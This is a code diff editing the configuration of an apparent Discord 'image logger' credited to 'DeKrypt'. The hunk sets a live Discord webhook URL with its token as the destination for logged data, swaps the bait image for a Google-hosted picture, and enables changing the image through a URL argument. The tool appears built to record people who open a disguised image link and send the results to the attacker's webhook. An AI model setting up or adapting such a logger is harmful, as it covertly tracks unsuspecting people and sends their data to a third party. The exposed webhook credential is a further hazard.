@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://canary.discord.com/api/webhooks/1445480327266173081/f-B3zaElCpGY-Fr60qTCJw7SmtSKkhWs1SuhGhCWVqgFJTdQEemJ_OLniULZNyeRitZa",
-    "image": "imge-discordgif-ie8pqw9zi-souls-projects-0dd72228.vercel.app", # You can also have a custom image by using a URL argument
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRYDQ0ARpWP6Ydrj2YV93LMzuJrRl59LctvI3M48pLXVMY4Mfn0Ik1KEgVex_byNKHs3p1fJbyr0CMy69bvibM0CySCPxbFEj7Uk_yXcHlTXQ&s=10", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
